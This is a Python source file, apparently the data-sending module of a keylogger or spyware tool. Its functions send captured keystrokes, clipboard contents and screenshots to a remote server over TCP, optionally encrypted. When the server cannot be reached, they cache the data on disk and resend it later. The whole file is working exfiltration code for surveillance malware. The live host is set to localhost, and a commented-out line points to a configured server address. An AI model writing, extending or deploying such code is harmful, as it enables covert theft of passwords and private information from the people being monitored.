import os
import json
import socket
import config
from encryption import encrypt_data
from utils import log, get_timestamp
from cache import ensure_cache_directory, purge_old_cache


#HOST, PORT = config.SERVER_IP, config.SERVER_PORT
HOST, PORT = '127.0.0.1', config.SERVER_PORT


def server_is_online():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)  # Short timeout for connection check
            s.connect((HOST, PORT))
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False  # These are expected when offline
    except Exception as e:
        log(f"Unexpected connection error: {e}", "ERROR", "sender")
        return False


def send_data(data, data_type):
    try:
        # Serialize data (Regular JSON payload for clipboard/keystrokes)
        payload = json.dumps({
            "type": data_type,
            "data": data
        })

        # Encrypt if enabled
        if config.USE_ENCRYPTION:
            encrypted = encrypt_data(payload)
            if encrypted is None:
                log("Failed to send data due to encryption failure", "ERROR", "sender")
                return False
            payload_bytes = b"\x01" + encrypted  # Encryption marker
        else:
            payload_bytes = b"\x00" + payload.encode('utf-8')  # Plaintext marker

        # Try to send it directly if online
        if server_is_online():
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(config.SOCKET_TIMEOUT)
                s.connect((HOST, PORT))

                # Send payload
                s.sendall(payload_bytes)
                log(f"Sent {data_type} data to server", "SUCCESS", "sender")
            return True

        # If offline, cache the data
        cache_dir = ensure_cache_directory()
        timestamp = get_timestamp(sanitized=True)
        cache_file = os.path.join(cache_dir, f"{data_type}_{timestamp}.json")

        with open(cache_file, "w") as f:
            json.dump({
                "type": data_type,
                "data": data,
                "timestamp": timestamp
            }, f)

        log(f"Cached {data_type} data (offline)", "WARNING", "sender")
        return False

    except socket.timeout:
        log(f"Connection to server timed out after {config.SOCKET_TIMEOUT}s", "WARNING", "sender")
    except Exception as e:
        log(f"Unexpected network error: {e}", "ERROR", "sender")
        return False


def send_screenshot(image_data, timestamp):
    try:
        # Create header
        header = json.dumps({
            "type": "screenshot",
            "timestamp": timestamp,
            "size": len(image_data)
        })

        # Build payload: header + binary marker + image
        payload = header.encode('utf-8') + b"\n\nBINARY\n\n" + image_data

        # Encrypt if enabled
        if config.USE_ENCRYPTION:
            encrypted = encrypt_data(payload)
            if encrypted is None:
                log("Failed to send data due to encryption failure", "ERROR", "sender")
                return False
            payload_bytes = b"\x01" + encrypted  # Encryption marker
        else:
            payload_bytes = b"\x00" + payload  # Plaintext marker

        # Try to send it directly if online
        if server_is_online():
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(config.SOCKET_TIMEOUT)
                s.connect((HOST, PORT))

                # Send payload
                s.sendall(payload_bytes)
                log(f"Sent screenshot to server", "SUCCESS", "sender")
            return True

        # If offline, cache the screenshot
        cache_dir = ensure_cache_directory()
        cache_file = os.path.join(cache_dir, f"screenshot_{timestamp}.jpg")

        with open(cache_file, "wb") as f:
            f.write(image_data)

        # Save metadata separately
        meta_file = os.path.join(cache_dir, f"screenshot_{timestamp}.json")
        with open(meta_file, "w") as f:
            json.dump({
                "type": "screenshot",
                "timestamp": timestamp
            }, f)

        log(f"Cached screenshot (offline)", "WARNING", "sender")
        return False

    except socket.timeout:
        log(f"Connection timed out after {config.SOCKET_TIMEOUT}s", "WARNING", "sender")
    except Exception as e:
        log(f"Failed to send screenshot: {e}", "ERROR", "sender")
        return False


def send_cached_data():
    cache_dir = config.CACHE_DIR
    if not os.path.exists(cache_dir):
        return

    log("Checking for cached data to send...", "DEBUG", "sender")

    # Process regular data files first
    for filename in sorted(os.listdir(cache_dir)):
        if filename.endswith(".json") and not filename.startswith("screenshot_"):
            filepath = os.path.join(cache_dir, filename)
            try:
                with open(filepath, "r") as f:
                    data = json.load(f)

                # Use original send function
                if send_data(data["data"], data["type"]):
                    os.remove(filepath)  # Remove only if successful
                    log(f"Sent cached {data['type']} data to server", "SUCCESS", "sender")
            except Exception as e:
                log(f"Failed to send cached data: {e}", "ERROR", "sender")

    # Process screenshots
    screenshot_files = {}
    for filename in os.listdir(cache_dir):
        if filename.endswith(".jpg") and filename.startswith("screenshot_"):
            # Find the matching metadata file
            base = filename[:-4]  # Remove .jpg extension
            screenshot_files[base] = {"img": filename}
        elif filename.endswith(".json") and filename.startswith("screenshot_"):
            base = filename[:-5]  # Remove .json extension
            if base in screenshot_files:
                screenshot_files[base]["meta"] = filename

    # Send in chronological order
    for base, files in sorted(screenshot_files.items()):
        if "img" in files and "meta" in files:
            img_path = os.path.join(cache_dir, files["img"])
            meta_path = os.path.join(cache_dir, files["meta"])

            try:
                with open(meta_path, "r") as f:
                    metadata = json.load(f)

                with open(img_path, "rb") as f:
                    image_data = f.read()

                # Use the original send function
                if send_screenshot(image_data, metadata["timestamp"]):
                    os.remove(img_path)
                    os.remove(meta_path)
                    log("Sent cached screenshot to sever", "SUCCESS", "sender")
            except Exception as e:
                log(f"Failed to send cached screenshot: {e}", "ERROR", "sender")

    # Cleanup old cache items
    purge_old_cache()
